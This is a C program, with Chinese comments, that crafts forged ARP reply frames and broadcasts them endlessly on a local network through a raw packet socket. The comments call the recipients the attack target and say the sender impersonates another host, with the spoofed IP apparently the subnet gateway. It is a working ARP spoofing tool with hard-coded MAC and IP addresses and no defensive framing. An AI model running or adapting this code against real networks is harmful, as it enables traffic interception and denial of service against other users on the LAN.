#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <net/if.h>
#include <netinet/in.h>
#include <string.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <zconf.h>
#include "model.h"

#define DEFAULT_DEVICE "eno16777736"

//arp -s 10.1.102.1 70-57-bf-7e-65-68

int main(int argc, char *argv[]) {
    int sock, size, bytes_send;
    struct sockaddr_ll sin;
    memset(&sin, 0, sizeof(sin));
    sin.sll_family = AF_PACKET;
    sin.sll_halen = htons(6);
    uint8_t src_mac[] = {0x00, 0x0c, 0x29, 0xc1, 0x09, 0x28};//
    memcpy(sin.sll_addr, src_mac, 6);
    char *interface = DEFAULT_DEVICE;
    if ((sin.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index ");
        exit(EXIT_FAILURE);
    }

    size = 60;
    uint8_t data[size];
    memset(&data, 0, sizeof(data));

    //bro_hw 攻击目标的mac地址
    uint8_t bro_hw[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };//所有
//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xdf, 0xe2};//shijie
//    uint8_t bro_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0xbd};//test

    //(10.1.102.1) at 70:57:bf:7e:65:68 [ether] on eno16777736
    //src_hw 假冒这个人   ip mac
//    uint8_t src_hw[] = { 0x70, 0x57, 0xbf, 0x7e, 0x65, 0x68 }; //tell
    uint8_t src_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11}; //tell
    uint8_t src_ip[] = {0x0a, 0x01, 0x66, 0x01}; //

    //dec_hw 发给攻击目标的   ip mac 映射
    //	uint8_t dec_hw[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //who has
    uint8_t dec_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11};
    uint8_t dec_ip[] = {0x0a, 0x01, 0x66, 0x01};

    //以太网首部
    printf("create ethhead, ethhdr size=%d字节\r\n", sizeof(struct ethhdr));
    struct ethhdr *ethhead = (struct ethhdr *) data;
    printf("1.广播mac地址\r\n");
    memcpy(ethhead->h_dest, bro_hw, 6);
    printf("2.源mac地址\r\n");
    memcpy(ethhead->h_source, src_hw, 6);
    printf("3.帧类型 ARP_FRAME_TYPE\r\n");
    //ip:0800,arp:0x0806,rarp:0x0835
    ethhead->h_proto = htons(0x0806);
    //----------------------------------------------------
    struct arp *arppacket = (struct arp *) (data + sizeof(struct ethhdr));

    printf("4.arp请求 应答\r\n");
    printf("create arppacket, ArpPacket size=%d字节, 除了padding是28字节\r\n", sizeof(struct arp));
    arppacket->hw_type = htons(0x0001);     //硬件类型
    arppacket->prot_type = htons(0x0800);   //协议类型
    arppacket->hw_addr_size = 6;               //硬件地址长度
    arppacket->prot_addr_size = 4;             //协议地址长度
    arppacket->op = htons(0x0002);          //操作类型    OP_ARP_QUEST 1  OP_ARP_REQUEST 2
    printf("发送端源mac地址\r\n");
    memcpy(arppacket->sndr_hw_addr, src_hw, 6);
    printf("发送端源ip地址\r\n");
    memcpy(arppacket->sndr_ip_addr, src_ip, 4);
    printf("目的mac地址\r\n");
    memcpy(arppacket->rcpt_hw_addr, dec_hw, 6);
    printf("目的ip地址\r\n");
    memcpy(arppacket->rcpt_ip_addr, dec_ip, 4);
    printf("padding\r\n");
    bzero(arppacket->padding, 18);

    printf("start send\r\n");

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        printf("create socket error!\r\n");
        exit(1);
    } else {
        printf("create socket!\r\n");
    }
    printf("[");
    for (int i = 0; i < size; i++) {
        printf("0x%x ", data[i]);
    }
    printf("] \r\n");

    int i = 0;
    for (;;) {
//    for (int i = 0; i < 100; i++) {
        bytes_send = sendto(sock, &data, sizeof(data), 0, (struct sockaddr *) &sin, sizeof(sin));
        if (bytes_send <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
        sleep(1);
        if (i < 5) {
            printf("send %d times! \r\n", i);
        }
        i++;
    }
    printf("end send\r\n");
    return 0;
}
